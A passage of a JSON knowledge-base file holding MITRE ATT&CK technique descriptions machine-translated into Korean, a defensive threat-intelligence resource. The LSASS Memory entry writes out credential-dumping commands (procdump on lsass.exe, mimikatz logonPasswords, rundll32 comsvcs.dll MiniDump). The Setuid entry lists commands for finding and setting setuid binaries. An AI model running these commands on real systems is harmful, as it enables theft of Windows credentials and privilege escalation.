통해 전송된 해시 정보를 수집할 수 있으며, 포트를 모니터링하는 도구를 사용하거나 해시를 오프라인에서 크랙하는 방법으로 평문 비밀번호를 획득할 수 있습니다.\n\n공격자가 시스템 간의 인증 경로에 있는 시스템에 액세스할 수 있거나, 자격 증명을 사용하는 자동 스캔이 공격자가 제어하는 시스템에 인증을 시도하는 경우 NTLMv1/v2 해시를 가로채고 전달하여 목표 시스템에 대한 코드 접근 및 실행을 수행할 수 있습니다. 중계 단계는 오염과 동시에 발생할 수 있지만 독립적으로도 이루어질 수 있습니다. 또한 공격자는 NTLMv1/v2 해시를 LDAP, SMB, MSSQL 및 HTTP와 같은 다양한 프로토콜에 캡슐화하여 유효한 NTLM 응답을 사용하여 여러 서비스를 확장하고 활용할 수 있습니다.\n\n지역 네트워크 내에서 이름 서비스를 오염시키기 위해 NBNSpoof, Metasploit 및 Responder와 같은 여러 도구가 사용될 수 있습니다.",
    "external_id": "T1557.001",
    "modified": "2022-10-25T15:46:55.393Z",
    "translated": true
  },
  {
    "title": "File and Directory Permissions Modification",
    "description": "적대 세력은 파일이나 디렉토리 권한/속성을 수정하여 접근 제어 목록(ACL)을 회피하고 보호된 파일에 접근할 수 있습니다. 파일 및 디렉토리 권한은 일반적으로 파일 또는 디렉토리 소유자 또는 적절한 권한을 가진 사용자가 구성한 ACL에 의해 관리됩니다. 파일 및 디렉토리 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자 또는 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\n수정 사항에는 특정 접근 권한을 변경하는 것이 포함될 수 있는데, 이는 파일이나 디렉토리의 기존 권한에 따라 소유권을 취득하거나/혹은 상승된 권한이 필요할 수 있습니다. 이는 특정 파일이나 디렉토리를 수정, 교체 또는 삭제하는 악성 활동을 가능하게 할 수 있습니다. 특정 파일 및 디렉토리 수정을 하는 것은 지속성을 구축하는 등의 여러 기술에 필요한 단계일 수 있습니다.\n\n적대 세력은 심볼릭 링크의 권한도 변경할 수 있습니다. 예를 들어, 악성 소프트웨어(특히 랜섬웨어)는 심볼릭 링크와 관련 설정을 수정하여 원격 경로에서 로컬 바로 가기를 통해 파일에 접근할 수 있도록 할 수 있습니다.",
    "external_id": "T1222",
    "modified": "2022-10-19T17:54:06.038Z",
    "translated": true
  },
  {
    "title": "LSASS Memory",
    "description": "적대자는 로컬 보안 권한 하위 시스템 서비스(LSASS)의 프로세스 메모리에 저장된 인증 정보를 접근하려고 시도할 수 있습니다. 사용자가 로그인하면 시스템은 다양한 인증 정보를 LSASS 프로세스 메모리에 생성하고 저장합니다. 이러한 인증 정보는 관리 사용자 또는 SYSTEM에 의해 수집될 수 있으며, 이를 사용하여 측면 이동을 수행할 수 있습니다.\n\n메모리 내 기술 외에도, LSASS 프로세스 메모리는 대상 호스트에서 덤프하여 로컬 시스템에서 분석할 수 있습니다.\n\n대상 호스트에서 procdump를 사용하십시오:\n\n* procdump -ma lsass.exe lsass_dump\n\n로컬에서 mimikatz를 실행할 수 있습니다:\n\n* sekurlsa::Minidump lsassdump.dmp\n* sekurlsa::logonPasswords\n\n'comsvcs.dll'과 같은 내장 Windows 도구도 사용할 수 있습니다:\n\n* rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full\n\n이미지 파일 실행 옵션 주입과 유사하게, 조용한 프로세스 종료 메커니즘은 Windows 오류 보고(WerFault.exe)를 통해 lsass.exe의 메모리 덤프를 생성하는 데 악용될 수 있습니다.\n\nWindows 보안 지원 프로바이더(SSP) DLL은 시스템 시작 시 LSASS 프로세스에 로드됩니다. LSA에 로드되면 SSP DLL은 Windows에 저장된 암호화된 비밀번호와 일반 텍스트 비밀번호에 접근할 수 있습니다. 여기에는 로그인된 사용자의 도메인 비밀번호나 스마트 카드 PIN이 포함됩니다. SSP 구성은 두 개의 레지스트리 키에 저장됩니다: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages 및 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. 적대자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이는 시스템이 다음 번 부팅할 때 로드되거나 AddSecurityPackage Windows API 함수가 호출될 때 로드됩니다.\n\n다음 SSP는 인증 정보를 접근하는 데 사용될 수 있습니다:\n\n* Msv: 대화형 로그인, 배치 로그인 및 서비스 로그인은 MSV 인증 패키지를 통해 이루어집니다.\n* Wdigest: 다이제스트 인증 프로토콜은 하이퍼텍스트 전송 프로토콜(HTTP) 및 단순 인증 보안 계층(SASL) 교환에 사용되도록 설계되었습니다.\n* Kerberos: Windows 2000 및 이후 버전에서 상호 클라이언트-서버 도메인 인증을 위해 권장됩니다.\n* CredSSP: 원격 데스크톱 서비스에 대한 SSO 및 네트워크 수준 인증을 제공합니다.",
    "external_id": "T1003.001",
    "modified": "2024-08-13T13:52:45.379Z",
    "translated": true
  },
  {
    "title": "Active Scanning",
    "description": "적대자는 표적 설정에 사용될 수 있는 정보를 수집하기 위해 능동 정찰 스캔을 실행할 수 있습니다. 능동 스캔은 적대자가 네트워크 트래픽을 통해 피해자의 인프라를 탐색하는 경우로, 직접적인 상호작용이 포함되지 않은 다른 형태의 정찰과는 다릅니다.\n\n적대자는 수집하고자 하는 정보에 따라 다양한 형태의 능동 스캔을 수행할 수 있습니다. 이러한 스캔은 ICMP와 같은 네트워크 프로토콜의 고유 기능을 사용하는 것을 포함하여 여러 가지 방법으로 수행될 수 있습니다. 이 스캔에서 수집된 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 가능하게 할 수 있습니다.",
    "external_id": "T1595",
    "modified": "2022-03-08T20:58:13.661Z",
    "translated": true
  },
  {
    "title": "Abuse Elevation Control Mechanism",
    "description": "적대자는 권한 상승을 제어하도록 설계된 메커니즘을 우회하여 더 높은 수준의 권한을 얻을 수 있습니다. 대부분의 현대 시스템에는 사용자가 기계에서 수행할 수 있는 권한을 제한하기 위해 설계된 기본 권한 상승 제어 메커니즘이 포함되어 있습니다. 특정 작업을 수행하기 위해서는 특정 사용자에게 권한이 부여되어야 하며, 이러한 작업은 더 높은 위험으로 간주될 수 있습니다. 적대자는 시스템에서 권한을 상승시키기 위해 내장된 제어 메커니즘을 활용하기 위한 여러 방법을 수행할 수 있습니다.",
    "external_id": "T1548",
    "modified": "2024-10-15T15:32:21.811Z",
    "translated": true
  },
  {
    "title": "Create Process with Token",
    "description": "적대자는 기존 토큰을 사용하여 새로운 프로세스를 생성함으로써 권한을 상승시키고 접근 제어를 우회할 수 있습니다. 프로세스는 <code>CreateProcessWithTokenW</code> 및 <code>runas</code>와 같은 기능을 사용하여 다른 사용자의 토큰과 결과적인 보안 컨텍스트로 생성될 수 있습니다.\n\n현재 사용자와 연결되지 않은 토큰으로 프로세스를 생성하려면 대상 사용자의 자격 증명, 해당 사용자를 가장할 수 있는 특정 권한 또는 사용될 토큰에 대한 접근 권한이 필요할 수 있습니다. 예를 들어, 토큰은 복제될 수 있거나 사용되기 전에 생성될 수 있습니다.\n\n이 기술은 특정한 방식에서 [토큰 가장 및 도난] 기술과 다르지만, 토큰이 복제된 후 새로운 프로세스를 생성하는 데 사용될 수 있어 두 기술이 함께 사용될 수 있습니다.",
    "external_id": "T1134.002",
    "modified": "2023-04-11T21:14:37.714Z",
    "translated": true
  },
  {
    "title": "Setuid and Setgid",
    "description": "적대자는 setuid 또는 setgid 비트가 설정된 애플리케이션의 구성을 악용하여 다른(그리고 가능성이 더 높은 권한을 가진) 사용자의 컨텍스트에서 코드를 실행할 수 있습니다. Linux 또는 macOS에서 애플리케이션 바이너리에 대해 setuid 또는 setgid 비트가 설정되면 해당 애플리케이션은 소유 사용자 또는 그룹의 권한으로 실행됩니다. 일반적으로 애플리케이션은 현재 사용자의 컨텍스트에서 실행되며, 애플리케이션을 소유한 사용자나 그룹과는 관계 없습니다. 그러나 프로그램이 제대로 작동하기 위해 상승된 컨텍스트에서 실행될 필요가 있는 경우가 있으며, 이를 실행하는 사용자가 특정한 필요한 권한을 가지고 있지 않을 수 있습니다.\n\n루트가 수행해야 하는 sudoers 파일에 항목을 만드는 대신, 모든 사용자는 자신의 애플리케이션에 대해 setuid 또는 setgid 플래그를 설정할 수 있습니다. <code>chmod</code> 명령어를 사용하여 비트 마스킹으로 이러한 비트를 설정할 수 있으며, <code>chmod 4777 [파일]</code> 또는 약식 이름을 통해 <code>chmod u+s [파일]</code>를 사용할 수 있습니다. 이는 setuid 비트를 활성화합니다. setgid 비트를 활성화하려면 <code>chmod 2775</code> 및 <code>chmod g+s</code>를 사용할 수 있습니다.\n\n적대자는 이 메커니즘을 자신의 맬웨어에 사용할 수 있어 나중에 상승된 컨텍스트에서 실행할 수 있도록 합니다. 이러한 악용은 종종 제한된 권한을 가진 실행 환경을 우회하기 위한 \"쉘 탈출\"이나 다른 행동의 일부로 발생합니다.\n\n또한, 적대자는 이미 setuid 또는 setgid 비트가 활성화된 취약한 바이너리를 찾아 표적을 삼을 수 있습니다. setuid 및 setgid 비트는 <code>ls -l</code>를 통해 파일 속성을 확인할 때 \"x\" 대신 \"s\"로 표시됩니다. <code>find</code> 명령어를 사용해서 이러한 파일을 검색할 수도 있습니다. 예를 들어, <code>find / -perm +4000 2>/dev/null</code>는 setuid가 설정된 파일을 찾는 데 사용될 수 있으며, <code>find / -perm +2000 2>/dev/null</code>는 setgid에 사용할 수 있습니다. 이러한 비트가 설정된 바이너리는 적대자에 의해 악용될 수 있습니다.",
    "external_id": "T1548.001",
    "modified": "2023-03-15T18:43:20.995Z",
    "translated": true
  },
  {
    "title": "Winlogon Helper DLL",
    "description": "적의는 사용자가 로그인할 때 DLL 및/또는 실행 파일을 실행하기 위해 Winlogon의 기능을 악용할 수 있습니다. Winlogon.exe는 로그인/로그오프 시의 동작과 Ctrl-Alt-Delete로 트리거되는 안전 주의 시퀀스(SAS)를 담당하는 Windows 구성 요소입니다. <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 및 <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>의 레지스트리 항목은 Winlogon을 지원하는 추가 도우미 프로그램 및 기능을 관리하는 데 사용됩니다.\n\n이러한 레지스트리 키에 대한 악의적인 수정은 Winlogon이 악성 DLL 및/또는 실행 파일을 로드하고 실행되도록 할 수 있습니다. 특히, 다음 하위 키가 악용에 취약할 수 있는 것으로 알려져 있습니다:\n\n* Winlogon\\Notify - Winlogon 이벤트를 처리하는 알림 패키지 DLL을 가리킴\n* Winlogon\\Userinit - 사용자가 로그인할 때 실행되는 사용자 초기화 프로그램인 userinit.exe를 가리킴\n* Winlogon\\Shell - 사용자가 로그인할 때 실행되는 시스템 셸인 explorer.exe를 가리킴\n\n적의는 이러한 기능을 악용하여 악성 코드를 반복적으로 실행하고 지속성을 확보할 수 있습니다.",
    "external_id": "T1547.004",
    "modified": "2024-02-14T21:24:37.780Z",
    "translated": true
  },
  {
    "title": "Distributed Component Object Model",
    "description": "적대자는 DCOM(분산 구성 요소 개체 모델)을 이용하여 유효한 계정을 통해 원격 컴퓨터와 상호 작용할 수 있습니다. 그 후, 적대자는 로그인한 사용자의 권한으로 행동을 수행할 수 있습니다.\n\nWindows 구성 요소 개체 모델(COM)은 소프트웨어 객체 간의 상호 작용을 가능하게 하는 기본 Windows 응용 프로그램 프로그래밍 인터페이스(API)의 한 구성 요소입니다. COM을 통해 클라이언트 객체는 일반적으로 동적 링크 라이브러리(DLL) 또는 실행 파일(EXE)인 서버 객체의 메서드를 호출할 수 있습니다. DCOM은 원격 프로시저 호출(RPC) 기술을 사용하여 COM의 기능을 로컬 컴퓨터를 넘어 확장하는 투명한 미들웨어입니다.\n\n로컬 및 원격 서버 COM 객체와 상호 작용하는 권한은 레지스트리의 접근 제어 목록(ACL)에 의해 지정됩니다. 기본적으로 관리자만 DCOM을 통해 원격에서 COM 객체를 활성화하고 실행할 수 있습니다.\n\n적절한 권한을 가진 사용자의 맥락에서 운영하는 적대자는 DCOM을 통해 Office 응용 프로그램을 사용하여 임의의 코드 실행을 원격으로 얻을 수 있으며, 또한 안전하지 않은 메서드를 포함하는 다른 Windows 객체에 대해서도 마찬가지입니다. DCOM은 기존 문서에서 매크로를 실행할 수 있으며, Microsoft Office 응용 프로그램의 COM 생성 인스턴스를 통해 DDE(동적 데이터 교환) 실행을 직접 호출할 수 있어 악성 문서 없이도 실행이 가능합니다. DCOM은 원격으로 Windows 관리 도구(WMI)와 상호 작용하는 방법으로도 사용될 수 있습니다.",
    "external_id": "T1021.003",
    "modified": "2023-08-11T20:21:55.610Z",
    "translated": true
  },
  {
    "title": "Password Spraying",
    "description": "적대자들은 유효한 계정 자격 증명을 확보하기 위해 여러 다른 계정에 대해 일반적으로 사용되는 비밀번호의 단일 또는 소규모 목록을 사용할 수 있습니다. 비밀번호 스프레이 공격은 하나의 비밀번호(예: 'Password01') 또는 복잡성 정책과 일치할 수 있는 일반적으로 사용되는 비밀번호의 소규모 목록을 사용합니다. 이 비밀번호로 네트워크의 여러 다른 계정에 대해 로그인을 시도하여 일반적으로 여러 비밀번호로 단일 계정을 강제로 로그인하려 할 때 발생하는 계정 잠금 방지할 수 있습니다.\n\n일반적으로 비밀번호 스프레이 공격 시 일반적으로 사용되는 포트를 통해 관리 서비스가 사용됩니다. 일반적으로 공격 대상이 되는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n관리 서비스 외에도 적대자들은 \"연합 인증 프로토콜을 사용하는 단일 로그인(SSO) 및 클라우드 기반 애플리케이션\"을 타겟으로 삼으며, Office 365와 같은 외부의 이메일 애플리케이션도 겨냥할 수 있습니다.\n\n기본 환경에서 LDAP 및 Kerberos 연결 시도가 SMB에서 이벤트를 유발할 가능성이 적어 Windows \"로그온 실패\" 이벤트 ID 4625가 생성되지 않을 수 있습니다.",
    "external_id": "T1110.003",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "External Proxy",
    "description": "적대적 행위자들은 자신의 인프라에 대한 직접 연결을 피하기 위해 커맨드 및 컨트롤 서버와의 네트워크 통신을 위해 외부 프록시를 중개자로 사용할 수 있습니다. 트래픽을 프록시를 통해 리디렉션하거나 포트를 리디렉션할 수 있는 도구들이 많이 존재합니다. 이러한 종류의 프록시는 커맨드 및 컨트롤 통신을 관리하고, 연결 손실에 대한 복원력을 제공하며, 기존의 신뢰할 수 있는 통신 경로를 통해 의심을 피하기 위해 사용됩니다.\n\n외부 연결 프록시는 C2 트래픽의 목적지를 숨기기 위해 사용되며, 일반적으로 포트 리디렉터와 함께 구현됩니다. 피해 환경 외부에 있는 손상된 시스템이 이러한 목적으로 사용될 수 있으며, 클라우드 기반 리소스나 가상 사설 서버와 같은 구매한 인프라도 사용될 수 있습니다. 손상된 시스템에서 외부 프록시에 대한 연결이 조사될 가능성이 낮다는 이유로 프록시를 선택할 수 있습니다. 피해 시스템은 인터넷에서 외부 프록시와 직접 통신하고, 이후 프록시는 커맨드 및 컨트롤 서버로 통신을 전달합니다.",
    "external_id": "T1090.002",
    "modified": "2024-04-16T12:19:08.953Z",
    "translated": true
  },
  {
    "title": "Web Portal Capture",
    "description": "적대자는 VPN 로그인 페이지와 같은 외부에 노출된 포털에 코드를 설치하여 서비스를 로그인하려는 사용자들의 자격 증명을 캡처하고 전송할 수 있습니다. 예를 들어, 손상된 로그인 페이지는 사용자가 서비스에 로그인하기 전에 제공된 사용자 자격 증명을 기록할 수 있습니다.\n\n입력 캡처의 이러한 변형은 정당한 관리 접근 권한을 이용하여 네트워크 접근을 유지하기 위한 백업 조치로서, 또는 외부에 노출된 웹 서비스를 악용하여 초기 손상의 일환으로 진행될 수 있습니다.",
    "external_id": "T1056.003",
    "modified": "2024-10-15T16:43:43.849Z",
    "translated": true
  },
  {
    "title": "Email Addresses",
    "description": "적대자는 목표 설정에 사용할 수 있는 이메일 주소를 수집할 수 있습니다. 내부 인스턴스가 존재하더라도, 조직은 직원들을 위한 공개-facing 이메일 인프라와 주소를 가지고 있을 수 있습니다.\n\n적대자는 이메일 주소를 쉽게 수집할 수 있으며, 이는 온라인이나 기타 접근 가능한 데이터 세트를 통해 쉽게 노출되어 있을 수 있습니다. 이메일 주소는 더 적극적인 방법을 통해 열거될 수도 있습니다. 예를 들어, 적대자는 인증 서비스의 응답을 probing하고 분석하여 시스템 내의 유효한 사용자 이름을 드러내는 방식으로 이메일 주소를 열거할 수 있습니다. 예를 들어, 적대자는 autodiscover 및 GetCredentialType과 같은 다양하게 공개된 API 엔드포인트를 쿼리함으로써 Office 365 환경에서 이메일 주소를 열거할 수 있습니다.\n\n이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 액세스를 수립하는 데 도움이 될 수 있습니다.",
    "external_id": "T1589.002",
    "modified": "2022-10-21T14:30:10.979Z",
    "translated": true
  },
  {
    "title": "Cached Domain Credentials",
    "description": "적대자들은 도메인 컨트롤러가 사용 불가능할 경우 인증을 허용하기 위해 사용되는 캐시된 도메인 자격 증명에 접근하려고 할 수 있습니다.\n\nWindows Vista 및 그 이후 버전에서는 해시 형식이 DCC2 (Domain Cached Credentials version 2) 해시로, MS-Cache v2 해시로도 알려져 있습니다. 기본 캐시된 자격 증명의 수는 다양하며 시스템에 따라 변경할 수 있습니다. 이 해시는 패스 더 해시 스타일 공격을 허용하지 않으며, 대신 평문 비밀번호를 복구하기 위해 비밀번호 크래킹이 필요합니다.\n\nLinux 시스템에서는 Active Directory 자격 증명에 System Security Services Daemon (SSSD) 또는 Quest Authentication Services(이전 VAS)와 같은 소프트웨어에서 유지되는 캐시를 통해 접근할 수 있습니다. SSSD의 경우 캐시된 자격 증명 해시는 `/var/lib/sss/db/cache.[domain].ldb`에, Quest의 경우는 `/var/opt/quest/vas/authcache/vas_auth.vdb`에 일반적으로 위치합니다. 적대자들은 이러한 데이터베이스 파일에서 캐시된 해시를 덤프하기 위해 `tdbdump`와 같은 유틸리티를 사용하고 비밀번호 크래킹을 통해 평문 비밀번호를 얻을 수 있습니다.\n\nSYSTEM 또는 sudo 접근 권한이 있을 경우, Mimikatz, Reg, Windows의 secretsdump.py 또는 Linux의 Linikatz와 같은 도구/유틸리티를 사용하여 캐시된 자격 증명을 추출할 수 있습니다.\n\n참고: Windows Vista의 캐시된 자격 증명은 PBKDF2를 사용하여 파생됩니다.",
    "external_id": "T1003.005",
    "modified": "2024-10-15T14:18:59.123Z",
    "translated": true
  },
  {
    "title": "SSH Authorized Keys",
    "description": "공격자는 희생자의 호스트에서 지속성을 유지하기 위해 SSH `authorized_keys` 파일을 수정할 수 있습니다. 리눅스 배포판과 macOS는 원격 관리를 위한 SSH 세션의 인증 프로세스를 보호하기 위해 일반적으로 키 기반 인증을 사용합니다. SSH의 `authorized_keys` 파일은 해당 파일이 구성된 사용자 계정에 로그인하는 데 사용할 수 있는 SSH 키를 지정합니다. 이 파일은 일반적으로 사용자의 홈 디렉터리의 `<user-home>/.ssh/authorized_keys`에 위치합니다. 사용자는 시스템의 SSH 구성 파일을 편집하여 PubkeyAuthentication 및 RSAAuthentication 지시어를 \"yes\"로 설정하여 공개 키 및 RSA 인증이 활성화되도록 할 수 있습니다. SSH 구성 파일은 일반적으로 `/etc/ssh/sshd_config`에 위치합니다.\n\n공격자는 스크립트나 셸 명령을 사용하여 SSH `authorized_keys` 파일을 직접 수정하여 자신의 공격자가 제공한 공개 키를 추가할 수 있습니다. 클라우드 환경에서 공격자는 명령 줄 인터페이스나 REST API를 통해 특정 가상 머신의 SSH `authorized_keys` 파일을 수정할 수 있습니다. 예를 들어, Google Cloud CLI의 \"add-metadata\" 명령을 사용하여 공격자가 사용자 계정에 SSH 키를 추가할 수 있습니다. 유사하게, Azure에서는 공격자가 API에 대한 PATCH 요청을 통해 가상 머신의 `authorized_keys` 파일을 업데이트할 수 있습니다. 이렇게 하면 해당 개인 키를 가진 공격자가 SSH를 통해 기존 사용자로 로그인할 수 있습니다. 또한, 가상 머신이나 인스턴스가 요청하는 사용자와 별도의 권한을 가질 경우 권한 상승으로 이어질 수 있습니다.\n\n클라우드 API나 명령 줄 인터페이스를 통해 `authorized_keys` 파일이 수정되는 경우, 공격자는 더 높은 권한을 가진 사용자에게 키를 추가하면 대상 가상 머신에서 권한 상승을 달성할 수 있습니다.\n\nSSH 키는 `ip ssh pubkey-chain` 명령을 사용하여 네트워크 장치의 계정에도 추가될 수 있습니다.",
    "external_id": "T1098.004",
    "modified": "2023-10-03T17:38:21.121Z",
    "translated": true
  },
  {
    "title": "Network Security Appliances",
    "description": "적대자는 목표를 정할 때 사용할 수 있는 피해자의 네트워크 보안 장비에 대한 정보를 수집할 수 있습니다. 네트워크 보안 장비에 대한 정보에는 배치된 방화벽, 콘텐츠 필터, 프록시/배스천 호스트의 존재 및 세부 사항과 같은 다양한 정보가 포함될 수 있습니다. 적대자는 또한 피해자의 네트워크 기반 침입 탐지 시스템(NIDS) 또는 방어 사이버 보안 작전과 관련된 기타 장비에 대한 정보를 목표로 할 수 있습니다.\n\n적대자는 이 정보를 여러 가지 방법으로 수집할 수 있으며, 예를 들어 직접 수집 작업을 통해 정보를 수집할 수 있습니다. 네트워크 보안 장비에 대한 정보는 또한 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다. 이 정보를 수집하면 다른 형태의 정찰 기회를 드러낼 수 있으며, 작전 자원을 구축하거나 초기 접근을 시도하는 기회를 제공할 수 있습니다.",
    "external_id": "T1590.006",
    "modified": "2021-04-15T03:31:54.275Z",
    "translated": true
  },
  {
    "title": "Image File Execution Options Injection",
    "description": "적대자는 이미지 파일 실행 옵션(IFEO) 디버거에 의해 트리거된 악성 콘텐츠를 실행하여 지속성을 설정하고/또는 권한을 상승시킬 수 있습니다. IFEO는 개발자가 애플리케이션에 디버거를 연결할 수 있게 해줍니다. 프로세스가 생성될 때, 애플리케이션의 IFEO에 존재하는 디버거는 애플리케이션 이름 앞에 붙게 되어 새로운 프로세스가 디버거 아래에서 실행됩니다.\n\nIFEO는 레지스트리를 통해 직접 설정하거나 GFlags 도구를 통해 글로벌 플래그에서 설정할 수 있습니다. IFEO는 레지스트리의 <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code>에서 <code>Debugger</code> 값으로 표시되며, 여기서 <code>&lt;executable&gt;</code>는 디버거가 연결된 바이너리입니다.\n\nIFEO는 지정된 프로그램이 조용히 종료될 때 임의의 모니터 프로그램을 실행할 수 있도록 허용할 수도 있습니다(즉, 프로그램이 스스로 또는 비 커널 모드 프로세스에 의해 조기 종료되는 경우). 디버거와 유사하게, 조용한 종료 모니터링은 GFlags를 통해 또는 IFEO와 조용한 프로세스 종료 레지스트리 값을 직접 수정하여 활성화할 수 있습니다.\n\nWindows Vista 이후 및 Windows Server 2008 이후, 레지스트리 키를 수정하여 \"cmd.exe\" 또는 백도어 접근을 제공하는 다른 프로그램을 접근성 프로그램의 \"디버거\"로 설정할 수 있습니다(예: utilman.exe). 레지스트리가 수정된 후, 로그인 화면에서 적절한 키 조합을 누르면 \"디버거\" 프로그램이 SYSTEM 권한으로 실행됩니다.\n\n이러한 값은 또한 악성 실행 파일이 컴퓨터의 별도 프로세스의 컨텍스트에서 로드되고 실행되도록 하여 권한 상승을 얻기 위해 악용될 수 있습니다. IFEO 메커니즘을 설치하면 지속성을 제공하여 지속적으로 트리거된 호출을 할 수 있습니다.\n\n악성 코드는 또한 무효 디버거를 등록하여 다양한 시스템 및 보안 애플리케이션을 효과적으로 비활성화하고 방향을 전환함으로써 방어를 손상시키기 위해 IFEO를 사용할 수 있습니다.",
    "external_id": "T1546.012",
    "modified": "2020-11-10T18:29:31.112Z",
    "translated": true
  },
  {
    "title": "Odbcconf",
    "description": "적대적인 공격자는 odbcconf.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. odbcconf.exe는 ODBC(개방형 데이터베이스 연결) 드라이버와 데이터 소스 이름을 구성할 수 있는 Windows 유틸리티입니다. odbcconf.exe 바이너리는 Microsoft에 의해 디지털 서명이 있을 수 있습니다.\n\n적대적인 공격자는 odbcconf.exe를 악용하여 잠재적인 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회할 수 있습니다. odbcconf.exe는 DLL을 실행하는 데 악용될 수 있는 <code>REGSVR</code> 플래그를 가지고 있습니다.",
    "external_id": "T1218.008",
    "modified": "2022-03-11T18:52:49.877Z",
    "translated": true
  },
  {
    "title": "Search Engines",
    "description": "적대자는 목표를 정하는 과정에서 사용할 수 있는 피해자에 대한 정보를 수집하기 위해 검색 엔진을 이용할 수 있습니다. 검색 엔진 서비스는 일반적으로 온라인 사이트를 크롤링하여 내용을 인덱싱하며, 사용자가 특정 키워드나 특정 유형의 콘텐츠(예: 파일 형식)를 검색할 수 있도록 전문화된 구문을 제공할 수 있습니다.\n\n적대자는 수집하고자 하는 정보에 따라 다양한 검색 엔진 쿼리를 구성할 수 있습니다. 위협 행위자는 피해자에 대한 일반 정보를 수집하기 위해 검색 엔진을 사용할 수 있으며, 또한 민감한 정보의 유출이나 노출(예: 네트워크 세부 정보나 자격 증명)을 찾기 위해 전문화된 쿼리를 사용할 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰 기회를 열어줄 수 있으며, 운영 자원을 구축하거나 초기 접근을 수립하는 데 활용될 수 있습니다.",
    "external_id": "T1593.002",
    "modified": "2024-09-12T19:19:47.758Z",
    "translated": true
  },
  {
    "title": "Business Relationships",
    "description": "적 adversaries는 타겟팅 중에 사용할 수 있는 피해자의 비즈니스 관계에 대한 정보를 수집할 수 있습니다. 조직의 비즈니스 관계에 대한 정보는 연결된(그리고 잠재적으로 접근 권한이 높은) 제2 또는 제3자 조직/도메인과 같은 다양한 세부 정보를 포함할 수 있습니다. 이 정보는 또한 피해자의 하드웨어 및 소프트웨어 자원에 대한 공급망과 배송 경로를 밝혀낼 수 있습니다.\n\n적 adversaries는 이러한 정보를 여러 방법으로 수집할 수 있으며, 그 중 하나는 직접적인 정보 유출 방식입니다. 비즈니스 관계에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 적 adversaries에게 노출될 수도 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 접근을 확보하는 데 도움이 될 수 있습니다.",
    "external_id": "T1591.002",
    "modified": "2021-04-15T03:36:58.964Z",
    "translated": true
  },
  {
    "title": "Temporary Elevated Cloud Access",
    "description": "적대자는 클라우드 리소스에 대한 일시적으로 높은 접근 권한을 얻을 수 있게 해주는 권한 구성의 취약점을 악용할 수 있습니다. 많은 클라우드 환경에서는 관리자가 사용자 또는 서비스 계정에게 역할에 대한 즉시 접근을 요청하거나 다른 계정을 가장하고, 자원 및 서비스에 역할을 전달하거나 기타 방법으로 자신과는 다른 권한 집합에 일시적으로 접근할 수 있는 권한을 부여할 수 있습니다.\n\n즉시 접근은 클라우드 계정에 추가 역할을 세부적이고 일시적으로 부여하는 메커니즘입니다. 이를 통해 계정은 일상적으로 필요한 권한만 가지고 작업하고 필요에 따라 추가 권한을 요청할 수 있습니다. 때때로 즉시 접근 요청은 수동 승인을 요구하도록 설정되기도 하고, 다른 경우에는 원하는 권한이 자동으로 부여됩니다.\n\n계정 가장은 사용자 또는 서비스 계정이 다른 계정의 권한으로 일시적으로 활동할 수 있도록 합니다. 예를 들어 GCP에서는 `iam.serviceAccountTokenCreator` 역할이 있는 사용자가 서비스 계정의 권한으로 임시 접근 토큰을 생성하거나 임의의 페이로드에 서명할 수 있으며, 도메인 전체 위임 권한이 있는 서비스 계정은 Google Workspace 계정을 가장할 수 있습니다. Exchange Online에서는 `ApplicationImpersonation` 역할이 서비스 계정이 특정 사용자 계정과 관련된 권한을 사용할 수 있도록 허용합니다.\n\n많은 클라우드 환경은 사용자가 자원에 역할을 전달하여 작업을 수행하고 다른 서비스에 인증할 수 있도록 하는 메커니즘도 포함하고 있습니다. 자원을 생성한 사용자가 해당 자원에 전달된 역할을 직접 수행하지는 않지만, 여전히 부여된 권한을 통해 역할의 접근 권한을 활용할 수 있습니다. 예를 들어, AWS에서는 `PassRole` 권한이 있는 사용자가 자신이 생성한 서비스가 지정된 역할을 수행하도록 허용할 수 있으며, GCP에서는 `iam.serviceAccountUser` 역할이 있는 사용자가 자원에 서비스 계정을 연결할 수 있습니다.\n\n사용자가 이러한 기능을 사용하기 위해 특정 역할 할당이 필요하지만, 클라우드 관리자가 권한을 잘못 구성할 수 있습니다. 이는 적대자가 원래 의도된 것보다 더 많은 자원에 접근할 수 있는 상승 경로를 초래할 수 있습니다.\n\n**참고:** 이 기술은 영구적인 역할을 계정에 할당하는 추가 클라우드 역할과는 구별되며, 기존 권한 구조를 악용하여 리소스에 대한 일시적으로 높은 접근 권한을 얻는 것입니다. 그러나 충분한 권한이 있는 계정을 손상한 적대자는 자신이 제어하는 다른 계정에 추가 클라우드 역할을 부여할 수 있으며, 이로 인해 이러한 기능을 악용할 수 있습니다. 이는 고도로 권한 있는 계정을 